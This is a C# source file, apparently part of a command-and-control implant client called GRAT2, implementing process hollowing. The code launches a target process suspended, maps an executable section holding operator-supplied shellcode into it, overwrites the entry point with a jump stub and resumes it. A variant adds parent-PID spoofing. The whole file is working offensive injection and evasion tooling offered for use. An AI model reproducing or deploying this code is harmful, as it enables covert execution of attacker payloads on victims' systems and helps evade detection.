using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static GRAT2_Client.PInvoke.flags;
using GRAT2_Client.PInvoke;

namespace GRAT2_Client.Injectious
{
    class ProcHollowing
    {
        public class ProcessHollowing
        {
            /*
            Credits goes to Aaron - https://github.com/ambray,  Michael Gorelik<smgorelik@gmail.com> and @_RastaMouse
            https://github.com/ambray/ProcessHollowing
            https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
            https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Hollower.cs
            */

            IntPtr section_;
            IntPtr localmap_;
            IntPtr remotemap_;
            IntPtr localsize_;
            IntPtr remotesize_;
            IntPtr pModBase_;
            IntPtr pEntry_;
            uint rvaEntryOffset_;
            uint size_;
            byte[] inner_;
            public const uint PageReadWriteExecute = 0x40;
            public const uint PageReadWrite = 0x04;
            public const uint PageExecuteRead = 0x20;
            public const uint MemCommit = 0x00001000;
            public const uint SecCommit = 0x08000000;
            public const uint GenericAll = 0x10000000;
            public const uint CreateSuspended = 0x00000004;
            public const uint DetachedProcess = 0x00000008;
            public const uint CreateNoWindow = 0x08000000;
            private const ulong PatchSize = 0x10;

            public uint round_to_page(uint size)
            {
                SYSTEM_INFO info = new SYSTEM_INFO();

                Interop.GetSystemInfo(ref info);

                return (info.dwPageSize - size % info.dwPageSize) + size;
            }

            const int AttributeSize = 24;

            private bool nt_success(long v)
            {
                return (v >= 0);
            }

            public IntPtr GetCurrent()
            {
                return Interop.GetCurrentProcess();
            }


            public static PROCESS_INFORMATION StartProcess(string binaryPath)
            {
                uint flags = CreateSuspended;

                STARTUPINFO startInfo = new STARTUPINFO();
                PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
                Interop.CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);

                return procInfo;
            }

            /*
            https://github.com/peperunas/injectopi/tree/master/CreateSection
            Attemp to create executatble section
            */
            public bool CreateSection(uint size)
            {
                LARGE_INTEGER liVal = new LARGE_INTEGER();
                size_ = round_to_page(size);
                liVal.LowPart = size_;

                long status = Interop.ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);
                return nt_success(status);
            }

            public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
            {
                IntPtr baseAddr = addr;
                IntPtr viewSize = (IntPtr)size_;

                long status = Interop.ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
                return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
            }

            public void SetLocalSection(uint size)
            {

                KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
                localmap_ = vals.Key;
                localsize_ = vals.Value;

            }

            public void CopyShellcode(byte[] buf)
            {
                long lsize = size_;

                unsafe
                {
                    byte* p = (byte*)localmap_;

                    for (int i = 0; i < buf.Length; i++)
                    {
                        p[i] = buf[i];
                    }
                }
            }

            public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
            {
                int i = 0;
                IntPtr ptr;

                ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

                unsafe
                {
                    byte* p = (byte*)ptr;
                    byte[] tmp = null;

                    if (IntPtr.Size == 4)
                    {
                        p[i] = 0xb8;
                        i++;
                        Int32 val = (Int32)dest;
                        tmp = BitConverter.GetBytes(val);
                    }
                    else
                    {
                        p[i] = 0x48;
                        i++;
                        p[i] = 0xb8;
                        i++;

                        Int64 val = (Int64)dest;
                        tmp = BitConverter.GetBytes(val);
                    }

                    for (int j = 0; j < IntPtr.Size; j++)
                        p[i + j] = tmp[j];

                    i += IntPtr.Size;
                    p[i] = 0xff;
                    i++;
                    p[i] = 0xe0;
                    i++;
                }

                return new KeyValuePair<int, IntPtr>(i, ptr);
            }

            private IntPtr GetEntryFromBuffer(byte[] buf)
            {
                IntPtr res = IntPtr.Zero;
                unsafe
                {
                    fixed (byte* p = buf)
                    {
                        uint e_lfanew_offset = *((uint*)(p + 0x3c));

                        byte* nthdr = (p + e_lfanew_offset);

                        byte* opthdr = (nthdr + 0x18);

                        ushort t = *((ushort*)opthdr);

                        byte* entry_ptr = (opthdr + 0x10);

                        int tmp = *((int*)entry_ptr);

                        rvaEntryOffset_ = (uint)tmp;

                        if (IntPtr.Size == 4)
                            res = (IntPtr)(pModBase_.ToInt32() + tmp);
                        else
                            res = (IntPtr)(pModBase_.ToInt64() + tmp);

                    }
                }

                pEntry_ = res;
                return res;
            }

            public IntPtr FindEntry(IntPtr hProc)
            {
                PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
                uint tmp = 0;

                long success = Interop.ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);

                IntPtr readLoc = IntPtr.Zero;
                byte[] addrBuf = new byte[IntPtr.Size];
                if (IntPtr.Size == 4)
                {
                    readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
                }
                else
                {
                    readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
                }

                IntPtr nRead = IntPtr.Zero;

                Interop.ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);

                if (IntPtr.Size == 4)
                    readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
                else
                    readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                pModBase_ = readLoc;

                Interop.ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);

                return GetEntryFromBuffer(inner_);
            }

            public void MapAndStart(PROCESS_INFORMATION pInfo)
            {

                KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);

                remotemap_ = tmp.Key;
                remotesize_ = tmp.Value;

                KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);

                try
                {

                    IntPtr pSize = (IntPtr)patch.Key;
                    IntPtr tPtr = new IntPtr();

                    Interop.WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);

                }
                finally
                {
                    if (patch.Value != IntPtr.Zero)
                        Marshal.FreeHGlobal(patch.Value);
                }

                byte[] tbuf = new byte[0x1000];
                IntPtr nRead = new IntPtr();
                Interop.ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);

                uint res = Interop.ResumeThread(pInfo.hThread);

            }

            public IntPtr GetBuffer()
            {
                return localmap_;
            }

            ~ProcessHollowing()
            {
                if (localmap_ != (IntPtr)0)
                    Interop.ZwUnmapViewOfSection(section_, localmap_);
            }

            public void Hollow(string targetProcess, byte[] buffer)
            {
                PROCESS_INFORMATION pinf = StartProcess(targetProcess);
                CreateSection((uint)buffer.Length);
                FindEntry(pinf.hProcess);
                SetLocalSection((uint)buffer.Length);
                CopyShellcode(buffer);
                MapAndStart(pinf);
                Interop.CloseHandle(pinf.hThread);
                Interop.CloseHandle(pinf.hProcess);
            }

            public ProcessHollowing()
            {
                section_ = new IntPtr();
                localmap_ = new IntPtr();
                remotemap_ = new IntPtr();
                localsize_ = new IntPtr();
                remotesize_ = new IntPtr();
                inner_ = new byte[0x1000];
            }

        }

        public static string ProcHollowRun(string[] arguments)
        {
            string targetProcess = arguments[2].Replace('+', ' ');

            byte[] buffer = DecGzip.DecompressGzipped(Convert.FromBase64String(arguments[1]));

            ProcessHollowing prochollow = new ProcessHollowing();
            prochollow.Hollow(targetProcess, buffer);

            return null;
        }

        public static string PPidProcHollowRun(string[] arguments)
        {
            string targetProcess = arguments[2].Replace('+', ' ');

            byte[] buffer = DecGzip.DecompressGzipped(Convert.FromBase64String(arguments[1]));

            PPID.ParentPidSpoofing Parent = new PPID.ParentPidSpoofing();
            PROCESS_INFORMATION pinf = Parent.ParentSpoofing(SearchPID.SearchForPPID(), targetProcess);

            ProcessHollowing hollow = new ProcessHollowing();
            hollow.CreateSection((uint)buffer.Length);
            hollow.FindEntry(pinf.hProcess);
            hollow.SetLocalSection((uint)buffer.Length);
            hollow.CopyShellcode(buffer);
            hollow.MapAndStart(pinf);
            Interop.CloseHandle(pinf.hThread);
            Interop.CloseHandle(pinf.hProcess);

            return null;

        }
    }
}
